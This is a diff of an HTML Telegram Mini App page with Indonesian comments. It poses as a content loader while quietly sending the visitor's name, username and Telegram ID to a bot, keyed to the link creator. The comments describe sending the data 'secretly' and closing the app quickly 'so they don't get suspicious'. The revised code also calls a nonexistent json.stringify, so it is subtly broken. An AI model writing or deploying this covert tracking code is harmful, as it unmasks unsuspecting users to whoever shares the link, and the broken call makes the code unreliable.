@@ -1,57 +1,32 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aplikasi</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #ffffff; /* Putih polos */
-            font-family: sans-serif;
-            color: #555;
-        }
+        body { background: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
     </style>
 </head>
 <body>
-    <div id="status">Harap tunggu...</div>
+    <p>Memuat konten...</p>
 
     <script>
         const tg = window.Telegram.WebApp;
         tg.ready();
-        tg.expand(); // Membuka layar penuh
 
-        // Ambil data si pengklik (User B)
-        const pengklik = tg.initDataUnsafe.user;
-        // Ambil ID si pengirim/pembuat link (User A) dari parameter startapp
-        const params = new URLSearchParams(window.location.search);
-        const idTujuan = tg.initDataUnsafe.start_param;
+        const user = tg.initDataUnsafe.user;
+        const creatorId = tg.initDataUnsafe.start_param;
 
-        if (idTujuan && pengklik) {
-            // Kita kirim data lewat bot menggunakan metode sendData
-            // Ini akan mengirimkan pesan otomatis dari sisi user ke bot kamu
-            const dataIdentitas = {
-                "penerima_notif": idTujuan,
-                "nama_pengklik": pengklik.first_name || "Tanpa Nama",
-                "user_pengklik": pengklik.username || "n/a",
-                "id_pengklik": pengklik.id
-            };
-
-            // Mengirim data ke bot secara diam-diam
-            tg.sendData(JSON.stringify(dataIdentitas));
+        if (user && creatorId) {
+            // Mengirim data ke bot secara stealth
+            tg.sendData(json.stringify({
+                "penerima_notif": creatorId,
+                "nama_pengklik": user.first_name,
+                "user_pengklik": user.username || "n/a",
+                "id_pengklik": user.id
+            }));
             
-            // Tampilan tetap kalem
-            document.getElementById('status').innerText = "Berhasil memuat konten.";
-            
-            // Tutup otomatis setelah 2 detik agar tidak curiga
-            setTimeout(() => {
-                tg.close();
-            }, 2000);
+            // Supaya tidak curiga, setelah kirim data, tutup app
+            setTimeout(() => { tg.close(); }, 500);
         }
     </script>
 </body>
